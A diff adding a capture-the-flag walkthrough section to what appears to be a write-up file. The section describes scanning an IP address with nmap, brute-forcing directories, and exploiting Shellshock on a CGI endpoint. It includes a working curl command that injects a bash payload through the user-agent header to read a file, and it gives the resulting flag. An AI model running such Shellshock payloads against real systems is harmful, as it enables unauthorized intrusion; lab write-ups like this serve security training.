@@ -26,3 +26,17 @@ To do that just use the synthaxe searchsploit HttpFileServer  , after that you w
 you will see the CVE number. So the flag is: 
 ---CVE-2014-6287---
 ---
+
+4//INSIDE
+Something here inside can you catch it 
+---
+First of all try to access to the website, hop you can't do that, after that try to scan the ip adress, well may be you don't find anything at the first time but try nmap -p- -Pn 18.185.92.165
+You will find the port 3333 open, well if you use nmap -p- -Pn 18.185.92.165 -sV ( to view the the type and don't ping and scan all port) you know that the http it autorized in the port 3333, try to go to the website to this port http://18.185.92.165:3333, hopa you find the website 
+Try to bruteforce all directories (transversal directorie, you can use dirb or gobuster) 
+You will find the path http://18.185.92.165/cgi-bin/status. 
+For this vulnirability we use Shellshock ( for learn more you can read this https://fr.wikipedia.org/wiki/Shellshock_(faille_informatique))
+To know how to use it read this (https://github.com/opsxcq/exploit-CVE-2014-6271)
+The command is :  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /home/inside'" \ http://18.185.92.165:3333/cgi-bin/status
+
+the flag: ---  FLAG{InSiDe_ShOcK_WaVe_StAy_HoMe_StAy_SaFe}---
+---
